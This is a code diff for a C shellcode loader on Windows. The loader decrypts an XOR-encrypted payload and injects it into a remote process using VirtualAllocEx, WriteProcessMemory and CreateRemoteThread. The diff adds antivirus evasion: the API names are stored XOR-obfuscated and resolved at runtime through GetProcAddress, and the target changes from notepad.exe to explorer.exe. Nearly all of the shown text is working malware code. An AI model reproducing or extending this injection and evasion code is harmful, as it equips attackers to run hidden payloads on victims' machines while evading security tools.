@@ -3,6 +3,35 @@
 #include <stdlib.h>
 #include <string.h>
 #include <tlhelp32.h>
+#include "resources.h"
+
+LPVOID (WINAPI * pVirtualAllocEx)(
+    HANDLE hProcess,
+    LPVOID lpAddres,
+    SIZE_T dwSize, 
+    DWORD flAllocationType,
+    DWORD flProtect
+);
+
+BOOL (WINAPI * pWriteProcessMemory)(
+    HANDLE  hProcess,
+    LPVOID  lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T  nSize,
+    SIZE_T  *lpNumberOfBytesWritten
+);
+
+HANDLE (WINAPI * pCreateRemoteThread)(
+    HANDLE                 hProcess,
+    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    SIZE_T                 dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID                 lpParameter,
+    DWORD                  dwCreationFlags,
+    LPDWORD                lpThreadId
+);
+
+char key[] = "mysecretkeee";
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
@@ -49,10 +78,25 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+    //XOR encrypted strings using xorencrypt.py 
+    unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
+    unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
+    unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
 
-    hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+    //XOR decryption 
+    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
+    XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
+    XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
+
+    //pointer declaration 
+    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
+    pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
+    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
+    
+    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+
+    hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
     if (hThread != NULL) {
         WaitForSingleObject(hThread, 500);
         CloseHandle(hThread);
@@ -74,8 +118,6 @@ int WINAPI WinMain(HINSTANCE, hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
     unsigned char * payload;
     unsigned int payload_len;
 
-    char key[] = "mysecretkeee";
-
     int pid = 0;
     HANDLE hProc = NULL;
     
@@ -95,7 +137,7 @@ int WINAPI WinMain(HINSTANCE, hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
     XOR((char *) exec_mem, payload_len, key, sizeof(key));
 
     //injection process 
-    pid = FindTarget("notepad.exe");
+    pid = FindTarget("explorer.exe");
 
     if (pid) {
         //try to open target process 
